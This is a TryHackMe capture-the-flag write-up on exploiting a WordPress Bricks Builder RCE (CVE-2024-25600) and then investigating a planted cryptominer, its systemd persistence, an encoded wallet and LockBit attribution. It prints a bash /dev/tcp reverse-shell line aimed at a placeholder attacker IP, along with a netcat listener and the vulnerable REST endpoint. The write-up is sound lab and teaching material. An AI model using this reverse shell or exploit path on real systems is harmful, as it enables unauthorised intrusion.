# TryHackMe — Bricks Heist

## Objective

Exploit a vulnerable WordPress installation, gain remote code execution, investigate a compromised system, identify persistence mechanisms, extract attacker infrastructure indicators, and perform basic threat attribution.

---

## Overview

This room focuses on:

- WordPress exploitation (theme vulnerability)
- Remote Code Execution (RCE)
- Reverse shell handling
- Linux process & service investigation
- systemd persistence analysis
- Log file discovery
- Multi-layer encoding analysis
- Basic blockchain OSINT
- Threat group attribution

The target was a WordPress instance running the **Bricks Builder theme**, vulnerable to unauthenticated RCE (CVE-2024-25600).

---

## Tools Used

- nmap
- curl
- netcat
- systemctl
- ps
- grep
- strings
- xxd
- base64
- Linux filesystem utilities
- Blockchain OSINT research

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -T4 bricks.thm
```

Open ports identified:

- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS – WordPress)
- 3306 (MySQL)

The WordPress application was accessible over HTTPS.

---

## Web Enumeration

Viewing the page source revealed:

```
/wp-content/themes/bricks/
```

The site was using the **Bricks Builder theme**.

Enumeration via:

```bash
curl -sk https://bricks.thm/wp-json/wp/v2/posts
```

Confirmed the presence of a valid post ID required for exploitation.

---

## Exploitation

The vulnerable endpoint:

```
/wp-json/bricks/v1/render_element
```

A crafted JSON payload was sent via `curl` to trigger command execution.

Proof of execution:

```bash
id
```

Confirmed execution as the web server user.

---

## Reverse Shell

Listener:

```bash
nc -lvnp 4444
```

Reverse shell payload:

```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

Shell access was obtained as the web service user.

---

## Post-Exploitation Analysis

### Suspicious Service Identification

Service enumeration:

```bash
systemctl list-units --type=service --state=running
```

Identified a suspicious service:

```
ubuntu.service
```

Inspecting the service file:

```bash
cat /etc/systemd/system/ubuntu.service
```

Revealed:

```
ExecStart=/lib/NetworkManager/nm-inet-dialog
```

The binary `nm-inet-dialog` was masquerading as a legitimate NetworkManager component.

---

## Miner Log File Discovery

Listing the directory:

```bash
ls -la /lib/NetworkManager/
```

Revealed a suspicious configuration file:

```
inet.conf
```

Viewing the file showed repeated mining activity:

```
[*] Miner()
[*] Status: Mining!
[*] Bitcoin Miner Thread Started
```

This confirmed `inet.conf` was functioning as the miner’s log file.

---

## Wallet Extraction

Inside `inet.conf`, an encoded identifier was discovered:

```
ID: <encoded_string>
```

The value required:

1. Hex decoding
2. Base64 decoding
3. Base64 decoding again

Decoding workflow:

```bash
echo <hex_string> | xxd -r -p
echo <base64_output> | base64 -d
echo <second_base64_output> | base64 -d
```

This revealed the attacker’s cryptocurrency wallet address.

---

## Threat Attribution

Using blockchain OSINT techniques:

- Wallet lookup via blockchain explorer
- Public threat intelligence search
- Wallet clustering research

The wallet activity was linked to:

```
LockBit
```

---

## Additional Findings

During investigation, another service (`badr.service`) was observed.

Although it exhibited miner-like behavior, it was not directly tied to the primary narrative path of the room.

This reinforced the importance of:

- Validating investigative scope
- Avoiding tunnel vision
- Differentiating artifacts from intended compromise paths

---

## Attack Chain Summary

1. WordPress site exposed vulnerable Bricks Builder theme
2. Unauthenticated RCE achieved via REST endpoint
3. Reverse shell obtained
4. Suspicious process identified
5. Persistence traced to systemd service
6. Miner log file discovered
7. Encoded wallet extracted
8. Wallet linked to known threat group

---

## Security Impact

- Public-facing CMS vulnerable to unauthenticated RCE
- Malicious miner deployed
- Persistence via systemd
- Encoded configuration to evade casual inspection
- Cryptocurrency infrastructure linked to ransomware operations

---

## Lessons Learned

- Themes and plugins expand attack surface significantly
- REST endpoints must be secured and authenticated
- systemd services are common persistence vectors
- Multi-layer encoding is frequently used in malware
- Threat attribution requires external intelligence validation
- Structured investigation prevents misdirection

---

## Final Notes

This room blended:

- Web exploitation
- Linux persistence analysis
- Log inspection
- Encoding analysis
- Blockchain OSINT
- Threat intelligence reasoning

A strong hybrid red/blue scenario reinforcing real-world investigative workflow.
